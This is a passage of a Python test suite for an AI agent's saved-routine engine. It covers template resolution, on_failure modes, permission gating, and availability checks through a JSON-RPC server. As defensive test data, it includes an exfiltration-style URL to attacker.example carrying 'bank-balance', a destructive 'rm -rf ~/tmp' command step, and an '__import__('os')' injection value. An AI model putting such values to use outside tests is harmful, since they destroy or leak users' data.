"""Routine engine/builder/library tests — engineering-spec §6, §9.

§9 names the tests that matter most here: template resolution in isolation,
each on_failure mode, and — the §8.5 invariant — a step needing an ungranted
permission pauses rather than executes. The engine must share the live
orchestrator's gate/registry instances, so a grant given in live conversation
carries over and a Routine can never out-permission the user.

The last section leaves the engine and drives ``routine.list`` / ``routine.run``
through the real server, because that is where AVAILABILITY is decided (owner
decision 2026-08-08, closing the routines half of docs/KNOWN-GAPS.md): a routine
is judged by what it NEEDS, never by the ``created_in_mode`` stamp it was born
with. Every test there seeds a stamp that disagrees with the plan, so a
stamp-reading implementation gets each one wrong.
"""

from __future__ import annotations

import ast
import json
from pathlib import Path

import pytest

from urllib.parse import urlsplit

from agent_core.main import build_registry
from agent_core.memory.store import Store
from agent_core.permissions.gate import PermissionGate, PermissionStatus
from agent_core.profiles import DEVELOPER
from agent_core.protocol import Method
from agent_core.routines.builder import RoutineBuilder
from agent_core.routines.engine import (
    RoutineEngine,
    resolve_template,
    topologically_sorted,
)
from agent_core.routines.library import RoutineLibrary
from agent_core.routines.model import Routine, RoutineStep, RoutineVariable, routine_to_json
from agent_core.snapshots.undo_manager import UndoManager
from agent_core.tools.base import (
    ActionSnapshot,
    ExecutionContext,
    RiskTier,
    ToolDefinition,
    ToolResult,
)
from agent_core.tools.registry import UNKNOWN_TOOL_REFUSAL, ToolRegistry
from tests.conftest import IPC_DB_NAME, _shutdown, build_server

_REPO_ROOT = Path(__file__).resolve().parent.parent
_ROUTINES_RPC_SRC = _REPO_ROOT / "agent_core" / "rpc" / "routines.py"
_WIDGETS_RPC_SRC = _REPO_ROOT / "agent_core" / "rpc" / "widgets.py"


class _Result:
    def __init__(self, content):
        self.content = content


# --- template resolution (isolated — the §9 "highest-value test") ------------

def test_resolve_variable_and_step_result_placeholders():
    resolved = resolve_template(
        {"filename": "{{output_filename}}", "content": "Total: {{step_1.result}}"},
        {"output_filename": "summary.txt"},
        {"step_1": _Result(42)},
    )
    assert resolved == {"filename": "summary.txt", "content": "Total: 42"}


def test_resolve_handles_nested_structures_and_whitespace():
    resolved = resolve_template(
        {"outer": {"inner": ["{{ name }}", 7]}, "plain": True},
        {"name": "mira"},
        {},
    )
    assert resolved == {"outer": {"inner": ["mira", 7]}, "plain": True}


def test_resolve_unknown_placeholder_raises_plainly():
    with pytest.raises(ValueError, match="needs a value for 'missing'"):
        resolve_template({"a": "{{missing}}"}, {}, {})
    with pytest.raises(ValueError, match="hasn't run yet"):
        resolve_template({"a": "{{step_9.result}}"}, {}, {})


def test_resolved_values_are_data_not_code():
    # A value that looks like an expression stays a literal string (§6.1/§6.2).
    resolved = resolve_template(
        {"expression": "{{amount}} * 2"}, {"amount": "__import__('os')"}, {}
    )
    assert resolved == {"expression": "__import__('os') * 2"}


def test_topological_sort_and_cycle_detection():
    steps = [
        RoutineStep("c", "t", {}, depends_on=["b"]),
        RoutineStep("a", "t", {}),
        RoutineStep("b", "t", {}, depends_on=["a"]),
    ]
    assert [s.step_id for s in topologically_sorted(steps)] == ["a", "b", "c"]
    cyclic = [
        RoutineStep("x", "t", {}, depends_on=["y"]),
        RoutineStep("y", "t", {}, depends_on=["x"]),
    ]
    with pytest.raises(ValueError, match="Cycle"):
        topologically_sorted(cyclic)


# --- engine ------------------------------------------------------------------

class _FlakyTool:
    """LOW tool scripted per-args: {"fail": True} fails, otherwise succeeds."""

    definition = ToolDefinition(
        id="flaky",
        label="Do a step",
        description="Test tool.",
        risk_tier=RiskTier.LOW,
        parameters_schema={"type": "object", "properties": {}},
    )

    def __init__(self):
        self.executed: list[dict] = []

    def execute(self, args: dict, context: ExecutionContext) -> ToolResult:
        self.executed.append(args)
        if args.get("fail"):
            return ToolResult(success=False, content="That step didn't work.")
        return ToolResult(success=True, content=args.get("value", "ok"))


class _SnapshotTool:
    definition = ToolDefinition(
        id="mutating",
        label="Change something",
        description="Test tool with undo.",
        risk_tier=RiskTier.MEDIUM,
        parameters_schema={"type": "object", "properties": {}},
    )

    def __init__(self):
        self.undone: list[str] = []

    def execute(self, args: dict, context: ExecutionContext) -> ToolResult:
        snapshot = ActionSnapshot(
            id="snap-1", tool_call_id="", tool_id="mutating",
            undo_payload={"x": 1}, created_at=1,
        )
        return ToolResult(success=True, content="changed", snapshot=snapshot)

    def undo(self, snapshot: ActionSnapshot) -> None:
        self.undone.append(snapshot.id)


class _RaisingTool:
    """LOW tool whose execute RAISES like a shell-bridge refusal — save_file's
    ``save_new_file`` raises RuntimeError ("A file with that name is already
    there") rather than returning success=False. A routine step must treat that
    as a FAILED step, not a crashed run."""

    definition = ToolDefinition(
        id="flaky",
        label="Do a step",
        description="Test tool that raises.",
        risk_tier=RiskTier.LOW,
        parameters_schema={"type": "object", "properties": {}},
    )

    def __init__(self, exc: Exception | None = None):
        self.executed: list[dict] = []
        self._exc = exc or RuntimeError(
            "A file with that name is already there — please choose another name."
        )

    def execute(self, args: dict, context: ExecutionContext) -> ToolResult:
        self.executed.append(args)
        raise self._exc


def _engine(tmp_path, tool=None, gate=None, on_ask_user=None, on_activity=None):
    registry = ToolRegistry()
    tool = tool or _FlakyTool()
    registry.register(tool)
    gate = gate or PermissionGate()
    store = Store(tmp_path / "routines.sqlite3")
    # The run log references the routines table (FK) — in production the engine
    # only ever runs SAVED routines (library.get), so tests persist one too.
    store.insert_routine(
        id="r-1", name="Test", description="", plan_json={},
        created_from_conversation_id=None, created_at=1,
    )
    undo = UndoManager(store=store, tool_registry=registry)
    engine = RoutineEngine(
        tool_registry=registry,
        permission_gate=gate,
        undo_manager=undo,
        on_ask_user=on_ask_user,
        store=store,
        on_activity=on_activity,
    )
    return engine, tool, gate, store


def _routine(steps, variables=()):
    return Routine(
        id="r-1", name="Test", description="", variables=list(variables), steps=steps
    )


class _DestinationStep:
    """A LOW tool that names what it reaches — read_web_page's shape, no network."""

    definition = ToolDefinition(
        id="destination_step",
        label="Read a web page",
        description="A test tool that reaches somewhere.",
        risk_tier=RiskTier.LOW,
        parameters_schema={"type": "object", "properties": {"url": {"type": "string"}}},
    )

    def permission_detail(self, args: dict) -> str | None:
        return urlsplit(str(args.get("url", ""))).hostname

    def execute(self, args: dict, context) -> ToolResult:
        return ToolResult(success=True, content="read it")


def test_a_routine_step_says_where_it_went_too(tmp_path):
    """The Activity Panel is the only place a page read's destination is shown, and
    a routine runs the same tools through the same gate.

    ``read_web_page`` is in the Simple profile's tool set, so a saved routine can
    contain a page-read step. This path emitted no activity at all, which made the
    visibility guarantee true of the live turn and false of the routine — i.e.
    false exactly where nobody is watching the screen. Same (tool_id, label, detail)
    signature as the orchestrator's, so the panel cannot tell the two apart.
    """
    seen: list[tuple] = []
    engine, _, gate, _ = _engine(
        tmp_path,
        tool=_DestinationStep(),
        on_activity=lambda tool_id, label, detail=None: seen.append((tool_id, label, detail)),
    )
    gate.grant("destination_step")

    result = engine.run(
        _routine([
            RoutineStep("s1", "destination_step",
                        {"url": "https://attacker.example/collect?d=bank-balance"}),
        ]),
        {},
    )

    assert result.status == "completed"
    assert seen == [("destination_step", "Read a web page", "attacker.example")]
    # Host only, here as in the live loop: the query is where an injected
    # instruction hides what it wants carried out, and a panel gets screenshotted.
    assert "bank-balance" not in str(seen)


def test_a_declined_routine_step_is_never_announced_as_done(tmp_path):
    """A denial must not put a line in the work list. The panel is a record of what
    Addison DID; announcing a step the person just refused would say the opposite."""
    seen: list[tuple] = []
    engine, _, _, _ = _engine(
        tmp_path,
        tool=_DestinationStep(),
        gate=PermissionGate(on_request=lambda tool_id: PermissionStatus.DENIED),
        on_activity=lambda tool_id, label, detail=None: seen.append((tool_id, label, detail)),
    )

    result = engine.run(
        _routine([RoutineStep("s1", "destination_step", {"url": "https://example.com/a"})]),
        {},
    )

    assert result.status == "failed"
    assert seen == []


def test_on_failure_abort_stops_the_run(tmp_path):
    engine, tool, gate, store = _engine(tmp_path)
    gate.grant("flaky")
    routine = _routine([
        RoutineStep("s1", "flaky", {"fail": True}, on_failure="abort"),
        RoutineStep("s2", "flaky", {}, depends_on=["s1"]),
    ])
    result = engine.run(routine, {})
    assert result.status == "failed"
    assert result.detail == "That step didn't work."
    assert len(tool.executed) == 1  # s2 never ran
    # Run log records the failure (§6.4).
    row = store._conn.execute("SELECT status FROM routine_runs").fetchone()
    assert row["status"] == "failed"


def test_on_failure_skip_continues(tmp_path):
    engine, tool, gate, _ = _engine(tmp_path)
    gate.grant("flaky")
    routine = _routine([
        RoutineStep("s1", "flaky", {"fail": True}, on_failure="skip"),
        RoutineStep("s2", "flaky", {"value": "second"}, depends_on=["s1"]),
    ])
    result = engine.run(routine, {})
    assert result.status == "completed"
    assert len(tool.executed) == 2


def test_on_failure_ask_user_continue_and_stop(tmp_path):
    answers = {"continue": True}
    asked: list[str] = []

    def ask(step, run_id, message):
        asked.append(message)
        return answers["continue"]

    engine, tool, gate, _ = _engine(tmp_path, on_ask_user=ask)
    gate.grant("flaky")
    routine = _routine([
        RoutineStep("s1", "flaky", {"fail": True}, on_failure="ask_user"),
        RoutineStep("s2", "flaky", {}, depends_on=["s1"]),
    ])

    result = engine.run(routine, {})
    assert result.status == "completed" and len(tool.executed) == 2
    assert asked == ["That step didn't work."]

    answers["continue"] = False
    tool.executed.clear()
    result = engine.run(routine, {})
    assert result.status == "cancelled"
    assert len(tool.executed) == 1  # stopped before s2


def test_ungranted_permission_pauses_and_denied_never_executes(tmp_path):
    requested: list[str] = []

    def on_request(tool_id):
        requested.append(tool_id)
        return PermissionStatus.DENIED

    engine, tool, gate, _ = _engine(tmp_path, gate=PermissionGate(on_request=on_request))
    routine = _routine([RoutineStep("s1", "flaky", {})])
    result = engine.run(routine, {})
    # The pause happened (the gate's request round-trip ran), the user said no,
    # and the tool NEVER executed — no auto-escalation (§8.5).
    assert requested == ["flaky"]
    assert result.status == "failed"
    assert tool.executed == []


def test_live_grant_carries_into_routine_run(tmp_path):
    # Shared-gate invariant: a grant given in live conversation means the
    # routine runs without asking again — and nothing more than that.
    engine, tool, gate, _ = _engine(tmp_path)
    gate.grant("flaky")   # "granted live, earlier"
    result = engine.run(_routine([RoutineStep("s1", "flaky", {})]), {})
    assert result.status == "completed"


def test_variable_defaults_fill_missing_values(tmp_path):
    engine, tool, gate, _ = _engine(tmp_path)
    gate.grant("flaky")
    routine = _routine(
        [RoutineStep("s1", "flaky", {"value": "{{name}}"})],
        variables=[RoutineVariable("name", "What name?", default="fallback")],
    )
    result = engine.run(routine, {})
    assert result.status == "completed"
    assert tool.executed == [{"value": "fallback"}]


def test_step_result_feeds_later_step_and_snapshots_recorded(tmp_path):
    registry = ToolRegistry()
    flaky, mutating = _FlakyTool(), _SnapshotTool()
    registry.register(flaky)
    registry.register(mutating)
    gate = PermissionGate()
    gate.grant("flaky")
    gate.grant("mutating")
    store = Store(tmp_path / "chain.sqlite3")
    store.insert_routine(
        id="r-1", name="Test", description="", plan_json={},
        created_from_conversation_id=None, created_at=1,
    )
    undo = UndoManager(store=store, tool_registry=registry)
    engine = RoutineEngine(registry, gate, undo, store=store)

    routine = _routine([
        RoutineStep("s1", "flaky", {"value": "42"}),
        RoutineStep("s2", "mutating", {}, depends_on=["s1"]),
        RoutineStep("s3", "flaky", {"value": "got {{s1.result}}"}, depends_on=["s2"]),
    ])
    result = engine.run(routine, {})
    assert result.status == "completed"
    assert flaky.executed[-1] == {"value": "got 42"}
    # The mutating step's snapshot is undoable like any live action (§6.4).
    undo_results = undo.undo_last(1)
    assert undo_results[0].success and mutating.undone == ["snap-1"]


def test_raising_tool_is_a_failed_step_not_a_crashed_run(tmp_path):
    # A tool that RAISES (shell-bridge refusal) must fail the step, honour the
    # on_failure policy, and — critically — still finish the run so its
    # routine_runs log isn't left stuck at 'running'. Before the fix the
    # exception propagated out of run(), skipping _finish entirely.
    engine, tool, gate, store = _engine(tmp_path, tool=_RaisingTool())
    gate.grant("flaky")
    routine = _routine([
        RoutineStep("s1", "flaky", {}, on_failure="abort"),
        RoutineStep("s2", "flaky", {}, depends_on=["s1"]),
    ])
    result = engine.run(routine, {})
    assert result.status == "failed"
    # The plain bridge sentence is carried through as the run detail (not a stack trace).
    assert "already there" in result.detail
    assert len(tool.executed) == 1  # aborted before s2
    # The run log was finalised, not abandoned mid-run.
    row = store._conn.execute("SELECT status FROM routine_runs").fetchone()
    assert row["status"] == "failed"


def test_a_step_naming_a_tool_that_is_gone_is_a_failed_step_not_a_crashed_run(tmp_path):
    """A saved step keeps the tool id it was written with, and an ``mcp:`` id is
    registered only for as long as THIS session's last check says a tool server
    offers it — a catalog lives in memory and discovery is on demand, so after a
    restart nothing is registered until somebody presses "Check now". Pressing Run
    on a routine built from a tool-server call therefore lands here, with no model
    misbehaving and nothing else wrong.

    Same requirement as the raising tool above, for the same reason: the run has to
    FINISH. An exception out of ``run()`` skips ``_finish``, and nothing else ever
    writes that row — so the log would say 'running', with no completed_at, for the
    life of the database.

    Mutation: change ``tool_registry.find`` back to ``get`` in the engine — this
    fails with a KeyError, and the row is left stuck."""
    engine, tool, gate, store = _engine(tmp_path)
    gate.grant("mcp:Design docs:search")
    result = engine.run(
        _routine([RoutineStep("s1", "mcp:Design docs:search", {}, on_failure="abort")]), {}
    )

    assert result.status == "failed"
    assert result.detail == UNKNOWN_TOOL_REFUSAL
    assert tool.executed == []
    # Plain language, and never the internal spelling of somebody else's tool.
    assert "mcp:" not in result.detail
    row = store._conn.execute(
        "SELECT status, completed_at, step_log_json FROM routine_runs"
    ).fetchone()
    assert row["status"] == "failed"
    assert row["completed_at"] is not None
    # ...and the log names the step that could not run, which is the whole of what
    # "show me what that routine did" has to answer here.
    (logged,) = json.loads(row["step_log_json"])
    assert logged["tool_id"] == "mcp:Design docs:search"
    assert logged["result_summary"] == UNKNOWN_TOOL_REFUSAL


def test_a_step_naming_a_missing_tool_can_be_skipped_like_any_other_failure(tmp_path):
    """The refusal is a failed STEP, not a failed run, so ``on_failure`` still
    decides — the property every other refusal branch in the engine has."""
    engine, tool, gate, _ = _engine(tmp_path)
    gate.grant("flaky")
    result = engine.run(
        _routine([
            RoutineStep("s1", "mcp:Design docs:search", {}, on_failure="skip"),
            RoutineStep("s2", "flaky", {"n": 2}, depends_on=["s1"]),
        ]),
        {},
    )
    assert result.status == "completed"
    assert tool.executed == [{"n": 2}]


def test_raising_tool_with_skip_continues_to_next_step(tmp_path):
    # on_failure="skip" applies to a RAISED failure exactly as to a returned one.
    engine, tool, gate, _ = _engine(tmp_path, tool=_RaisingTool())
    gate.grant("flaky")
    routine = _routine([
        RoutineStep("s1", "flaky", {"n": 1}, on_failure="skip"),
        RoutineStep("s2", "flaky", {"n": 2}, depends_on=["s1"], on_failure="skip"),
    ])
    result = engine.run(routine, {})
    # Both steps ran (the raise didn't abort the run); the run completed.
    assert result.status == "completed"
    assert tool.executed == [{"n": 1}, {"n": 2}]


def test_non_runtime_error_from_tool_becomes_plain_failed_step(tmp_path):
    # A non-RuntimeError (a genuine bug in a tool) must not leak its repr — it
    # collapses to one plain sentence, same as the live orchestrator.
    engine, tool, gate, _ = _engine(
        tmp_path, tool=_RaisingTool(exc=ValueError("boom internal detail"))
    )
    gate.grant("flaky")
    result = engine.run(_routine([RoutineStep("s1", "flaky", {}, on_failure="abort")]), {})
    assert result.status == "failed"
    assert result.detail == "That step didn't work."
    assert "boom internal detail" not in result.detail


# --- builder (§6.3) ----------------------------------------------------------

class _Call:
    def __init__(self, tool_id, args):
        self.id = "c"
        self.tool_id = tool_id
        self.args = args


class _Msg:
    def __init__(self, role, content="", tool_calls=(), past_tool_calls=()):
        self.role = role
        self.content = content
        self.tool_calls = list(tool_calls)
        # What conversation.load restores onto a reopened chat's messages instead
        # of tool_calls — history the builder may read and no provider replays
        # (providers/base.py owns why the two are separate fields).
        self.past_tool_calls = list(past_tool_calls)


class _Conv:
    def __init__(self, messages):
        self.id = "conv-1"
        self.messages = messages


def test_builder_extracts_tool_calls_not_prose_and_generalizes():
    conversation = _Conv([
        _Msg("user", "add up my invoices and save it"),
        _Msg("assistant", "", [_Call("read_file", {"file_handle": "handle-123"})]),
        _Msg("tool", "invoice text"),
        _Msg("assistant", "", [_Call("save_file", {"filename": "total.txt", "content": "x"})]),
        _Msg("tool", "/Users/mira/Desktop/total.txt"),
        _Msg("assistant", "All done! I saved the total."),
    ])
    draft = RoutineBuilder().propose_from_recent_actions(conversation)

    assert [s.tool_id for s in draft.steps] == ["read_file", "save_file"]
    # Sequential chain mirrors what happened live.
    assert draft.steps[1].depends_on == ["step_1"]
    # Session-scoped file handle -> variable with NO default (must re-pick).
    assert draft.steps[0].args_template == {"file_handle": "{{chosen_file}}"}
    # Filename -> variable keeping the literal as its default.
    assert draft.steps[1].args_template["filename"] == "{{output_filename}}"
    by_name = {v.name: v for v in draft.variables}
    assert by_name["chosen_file"].default is None
    assert by_name["output_filename"].default == "total.txt"


def test_builder_reads_a_reopened_conversations_restored_calls():
    """KNOWN-BUGS #5: a chat reopened after a relaunch is still saveable.

    ``conversation.load`` cannot put restored calls back on ``tool_calls`` — a
    provider replays that field, and a ``tool_use`` sent without the
    ``tool_result`` that answered it makes the API reject every later request of
    the session — so it puts them on ``past_tool_calls`` instead. To a routine the
    two are the same thing: steps the person watched happen. The message here
    carries ONLY the restored field, which is exactly the shape a reload produces.
    """
    restored = _Msg(
        "assistant", "All done!",
        past_tool_calls=[_Call("save_file", {"filename": "total.txt"})],
    )
    conversation = _Conv([_Msg("user", "save my total"), restored])

    draft = RoutineBuilder().propose_from_recent_actions(conversation)

    assert [s.tool_id for s in draft.steps] == ["save_file"]
    # The generalization is the live one, not a lesser copy for reloaded chats.
    assert draft.steps[0].args_template["filename"] == "{{output_filename}}"


def test_builder_raises_plainly_when_nothing_to_extract():
    with pytest.raises(ValueError, match="couldn't find any actions"):
        RoutineBuilder().propose_from_recent_actions(_Conv([_Msg("user", "hello")]))


def test_preview_is_plain_language():
    registry = ToolRegistry()
    registry.register(_FlakyTool())
    draft = _routine([RoutineStep("s1", "flaky", {})])
    preview = RoutineBuilder().preview(draft, registry)
    assert preview["steps"] == ["1. Do a step"]      # label, not tool_id / raw JSON
    assert preview["routineId"] == draft.id


# --- library + persistence (§6.5) --------------------------------------------

def test_library_crud_round_trip(tmp_path):
    store = Store(tmp_path / "lib.sqlite3")
    builder = RoutineBuilder(store=store)
    library = RoutineLibrary(store=store)

    draft = _routine(
        [RoutineStep("s1", "flaky", {"value": "{{name}}"})],
        variables=[RoutineVariable("name", "What name?", default="a")],
    )
    builder.save(draft, conversation_id=None)

    rows = library.list()
    assert len(rows) == 1 and rows[0]["routine"].name == "Test"

    # v1 edit surface: metadata + variable defaults only (§6.5).
    library.update_metadata("r-1", name="Renamed", variable_defaults={"name": "b"})
    updated = library.get("r-1")
    assert updated.name == "Renamed"
    assert updated.variables[0].default == "b"
    # Step sequence untouched by a metadata edit.
    assert [s.step_id for s in updated.steps] == ["s1"]

    library.record_run("r-1")
    assert library.list()[0]["runCount"] == 1

    library.delete("r-1")
    assert library.list() == []
    with pytest.raises(KeyError):
        library.get("r-1")


# ===========================================================================
# Availability — asked of the ROUTINE, never of its stamp (owner decision
# 2026-08-08; docs/SAFETY.md owns the rule, docs/KNOWN-GAPS.md held the gap).
#
# Two surfaces have to agree: the `unavailable` marker `routine.list` puts on a
# row, and the refusal `routine.run` gives. They used to be computed from two
# copies of `created_in_mode == 'open'`, which is a question about where a
# routine was BORN — so a routine of nothing but everyday steps, saved while
# Developer happened to be active, arrived in Simple disabled and was refused,
# announcing that it "uses developer abilities" about a plan that uses none.
#
# EVERY FIXTURE BELOW SEEDS A STAMP THAT DISAGREES WITH ITS PLAN. That is the
# whole design of this section: a stamp-reading implementation gets each of
# these wrong in a way the assertions name, rather than being right by accident
# on the common case.
#
# These enter through the real JSON-RPC server with the REAL tool registry
# (`build_registry(DEVELOPER)`), because half the question is which tools the
# SAFE view holds — `read_project_file` is registered `open_only`, and no
# hand-rolled test registry would reproduce that.
# ===========================================================================

# Frozen copy (rpc/constants.py holds it once, for both the marker and the
# refusal), asserted as a literal: a test that compares a payload against the
# constant it was built from passes whatever that constant says.
_WAITING = "That routine uses developer abilities, so it's waiting in Developer profile."
_WIDGET_WAITING = "That widget uses developer abilities, so it's waiting in Developer profile."
_DISABLED = {"reason": "developer_abilities", "message": _WAITING}


def _seeded(tmp_path, routines, widgets=(), profile_id="simple"):
    """Seed routines (each as ``(Routine, created_in_mode)``) + optional widgets,
    then start a server carrying the real Developer registry."""
    store = Store(tmp_path / IPC_DB_NAME)
    store.set_setting("widgets_seeded", "1")
    store.set_setting("active_profile", profile_id)
    for routine, mode in routines:
        store.insert_routine(
            id=routine.id,
            name=routine.name,
            description=routine.description,
            plan_json=routine_to_json(routine),
            created_from_conversation_id=None,
            created_at=1,
            created_in_mode=mode,
        )
    for position, (widget_id, spec) in enumerate(widgets):
        store.insert_widget(
            id=widget_id,
            spec_json=json.dumps(spec),
            pinned=True,
            position=position,
            created_at=1,
            created_in_mode="safe",
        )
    store.close()
    return build_server(tmp_path, responses=[], registry=build_registry(DEVELOPER))


def _plan(routine_id: str, steps: list[RoutineStep]) -> Routine:
    return Routine(id=routine_id, name=routine_id, description="", variables=[], steps=steps)


def _call(h, request_id: int, method: str, params=None) -> dict:
    frame = {"jsonrpc": "2.0", "id": request_id, "method": method}
    if params is not None:
        frame["params"] = params
    h.reader.feed(frame)
    return h.writer.wait_for(
        lambda f: f.get("id") == request_id and ("result" in f or "error" in f)
    )


def _rows(h, request_id: int) -> dict:
    return {r["id"]: r for r in _call(h, request_id, Method.ROUTINE_LIST)["result"]["routines"]}


def test_a_routine_of_only_simple_steps_is_usable_in_simple_whatever_made_it(tmp_path):
    """THE REGRESSION TEST, and the one the closed gap was named for.

    A ``calculator`` routine needs nothing developer about it — the tool is in
    ``visible_tools(SAFE)`` and the plan carries no command step. Saved while the
    Developer profile happened to be active, it is stamped 'open', and under the
    stamp that stamp was the whole answer: Simple listed it disabled and
    ``routine.run`` refused it outright, telling the person their arithmetic
    "uses developer abilities".

    Both halves are asserted, because they were two separate wrong answers: the
    row carries no marker, AND the routine actually RUNS — through the ordinary
    SAFE gate, which cards for the tool exactly as a live call would (invariant 3:
    a routine never gets permissions beyond what the user granted live). The card
    is what makes the run meaningful; a run that skipped it would be a different
    bug wearing this test's green.

    The stamp still rides the wire, and the last line pins it: 'fixed' must not
    mean 'stopped recording where it came from' — the frontend badges DEV with it.

    Mutations: (a) restore ``entry.get("createdInMode") == 'open'`` as the marker
    decision — this fails on the first assertion; (b) restore the stamp test in
    ``_handle_routine_run`` — this fails on the run."""
    h = _seeded(
        tmp_path, [(_plan("calc", [RoutineStep("s1", "calculator", {"expression": "1+1"})]), "open")]
    )
    try:
        row = _rows(h, 1)["calc"]
        assert "unavailable" not in row

        h.reader.feed({"jsonrpc": "2.0", "id": 2, "method": Method.ROUTINE_RUN,
                       "params": {"routineId": "calc"}})
        card = h.writer.wait_for(lambda f: f.get("method") == Method.PERMISSION_REQUEST_GRANT)
        assert card["params"]["toolId"] == "calculator"
        h.reader.feed({"jsonrpc": "2.0", "id": 3, "method": Method.PERMISSION_RESPOND,
                       "params": {"toolId": "calculator", "allow": True}})
        result = h.writer.wait_for(lambda f: f.get("id") == 2 and "result" in f)["result"]
        assert result["ok"] is True and result["status"] == "completed"

        assert _rows(h, 4)["calc"]["createdInMode"] == "open"
    finally:
        _shutdown(h.reader, h.thread)


def test_a_routine_naming_a_developer_only_tool_is_disabled_and_refused_in_simple(tmp_path):
    """THE CASE ``routine_uses_dev_abilities`` ALONE MISSES, and the reason the
    question lives in the RPC layer at all.

    ``read_project_file`` is registered ``open_only``: absent from
    ``visible_tools(SAFE)`` and refused at dispatch outside OPEN. A routine naming
    it carries NO command step, so the plan-only test answers "needs nothing" — and
    the row would sit in Simple offering a Run that the engine refuses one click
    later. Only the registry knows, and the module-boundary rule keeps
    ``routines/`` from asking it, which is why ``_routine_needs_dev`` is where it
    is.

    Stamped 'safe' on purpose: this row is the one a stamp-reader calls usable.

    That it is the PROFILE talking and not something permanent is pinned by the
    second half — in Developer the same row is unmarked and the same call stops
    being refused for this reason. An assertion on "refused" alone would prove
    nothing; it is the sentence CHANGING that shows what drove the first refusal.

    Mutations: (a) drop the ``visible_tools(SAFE)`` clause from
    ``_routine_needs_dev``, leaving ``routine_uses_dev_abilities`` — this fails on
    the marker and the refusal; (b) decide from the stamp — same failure, since
    this row is stamped 'safe'."""
    h = _seeded(
        tmp_path,
        [(_plan("reader", [RoutineStep("s1", "read_project_file", {"path": "README.md"})]), "safe")],
    )
    try:
        assert _rows(h, 1)["reader"]["unavailable"] == _DISABLED
        refused = _call(h, 2, Method.ROUTINE_RUN, {"routineId": "reader"})["error"]
        assert refused["message"] == _WAITING

        assert _call(h, 3, Method.PROFILE_SET, {"profileId": "developer"})["result"]["mode"] == (
            "open"
        )
        assert "unavailable" not in _rows(h, 4)["reader"]
        in_open = _call(h, 5, Method.ROUTINE_RUN, {"routineId": "reader"})
        assert _WAITING not in json.dumps(in_open)
    finally:
        _shutdown(h.reader, h.thread)


def test_a_command_routine_is_disabled_and_refused_in_simple_whatever_its_stamp(tmp_path):
    """The reverse decoy. A hand-edited row, an older build or a restored payload
    can carry a command step behind a 'safe' stamp — no tool can produce one, and
    that is exactly why the stamp is worth nothing as an answer. Both rows here
    carry the same plan and disagree about their provenance, and both are treated
    the same, because what decides is the plan.

    The 'open'-stamped row is the case the old code got right for the wrong
    reason, kept beside it so a mutation that satisfies one row has to satisfy
    both.

    Mutation: decide from the stamp — this fails on ``cmd-safe`` alone, in both
    the marker and the refusal, and that single-row failure is the point."""
    command_step = [RoutineStep("s1", "run_command", {}, command="rm -rf ~/tmp")]
    h = _seeded(
        tmp_path,
        [(_plan("cmd-open", command_step), "open"), (_plan("cmd-safe", command_step), "safe")],
    )
    try:
        rows = _rows(h, 1)
        assert rows["cmd-open"]["unavailable"] == _DISABLED
        assert rows["cmd-safe"]["unavailable"] == _DISABLED
        for request_id, routine_id in ((2, "cmd-open"), (3, "cmd-safe")):
            refused = _call(h, request_id, Method.ROUTINE_RUN, {"routineId": routine_id})["error"]
            assert refused["message"] == _WAITING, routine_id
    finally:
        _shutdown(h.reader, h.thread)


def test_the_rail_and_the_library_never_disagree_about_one_routine(tmp_path):
    """The follow-on line the gap named. A ``{"kind": "routine"}`` widget is
    SAFE-legal by SHAPE whatever it points at, so ``rpc/widgets.py`` looks THROUGH
    the launcher at the routine — and until this landed it looked through at the
    routine's STAMP, deliberately, so that the rail and the library could not
    disagree about the same routine. They still cannot; they now agree on the right
    answer, because there is one answer (``_routine_id_needs_dev`` asks
    ``_routine_needs_dev``).

    Both directions are pinned. The usable routine's Run pill stays LIVE in the
    Simple rail — a rail that disabled it would be the same false sentence in a
    second place — and the dev routine's pill is inert. The widget says it in the
    WIDGET's words, which is the one thing that legitimately differs.

    Mutation: point the look-through back at the stamp — this fails on ``w-calc``,
    whose routine is stamped 'open' and needs nothing."""
    h = _seeded(
        tmp_path,
        [
            (_plan("calc", [RoutineStep("s1", "calculator", {"expression": "1+1"})]), "open"),
            (_plan("reader", [RoutineStep("s1", "read_project_file", {"path": "x"})]), "safe"),
        ],
        widgets=[
            ("w-calc", {"kind": "routine", "routineId": "calc", "title": "Add up"}),
            ("w-reader", {"kind": "routine", "routineId": "reader", "title": "Read it"}),
        ],
    )
    try:
        routines = _rows(h, 1)
        widgets = {
            w["id"]: w for w in _call(h, 2, Method.WIDGET_LIST)["result"]["widgets"]
        }
        assert "unavailable" not in widgets["w-calc"]
        assert widgets["w-reader"]["unavailable"] == {
            "reason": "developer_abilities", "message": _WIDGET_WAITING,
        }
        # The pairing, stated as the property rather than as four literals: for the
        # same routine, the rail and the library are never in different states.
        for widget_id, routine_id in (("w-calc", "calc"), ("w-reader", "reader")):
            assert ("unavailable" in widgets[widget_id]) == (
                "unavailable" in routines[routine_id]
            ), widget_id
    finally:
        _shutdown(h.reader, h.thread)


def test_availability_is_never_decided_from_where_a_routine_was_born():
    """THE STRUCTURAL HALF, and the reason this section has one: the round-trips
    above are green on the payload, and a payload cannot show that the marker and
    the refusal are ONE answer rather than two that currently match. Two
    expressions that agree today are the shape the widget/routine split already
    took once — widgets were converted on 2026-08-06 and routines were not, and the
    two surfaces then said different things about the same artifact for two days.

    So four pins, adapted from ``tests/test_automations.py``'s scan (whose module
    hands ``_unavailable_marker`` a literal ``True`` — every automation runs a
    command, so it has no per-row question at all). Routines DO have a per-row
    question; what this pins is that it is asked ONCE, of the routine:

      1. exactly one unavailability decision in ``rpc/routines.py``, and it is a
         CALL to ``self._routine_needs_dev`` — not an expression, however correct;
      2. ``_handle_routine_run`` asks that same function, and names the stamp
         nowhere;
      3. no branch, comparison or boolean operator ANYWHERE in the module names
         ``created_in_mode``/``createdInMode`` — the stamp reaches the wire as
         display provenance and is read for nothing else;
      4. ``rpc/widgets.py``'s look-through asks the routines question rather than
         re-answering it, and names no stamp either.

    Mutations: inline ``routine_uses_dev_abilities(routine)`` at either call site
    (pin 1 or 2 — one answer, not two); restore
    ``created_in_mode(routine_id) == 'open'`` in dispatch (pins 2 and 3); clear the
    marker behind ``if entry.get("createdInMode") == "safe"`` (pin 3, which is why
    pin 1 alone was not enough); point ``_widget_needs_dev`` back at the stamp
    (pin 4)."""
    stamp = {"created_in_mode", "createdInMode"}

    def names_stamp(node) -> bool:
        for inner in ast.walk(node):
            if isinstance(inner, ast.Attribute) and inner.attr in stamp:
                return True
            if isinstance(inner, ast.Name) and inner.id in stamp:
                return True
            # Exact match only: a docstring EXPLAINING the stamp is prose, and
            # this scan is about what the code asks.
            if isinstance(inner, ast.Constant) and inner.value in stamp:
                return True
        return False

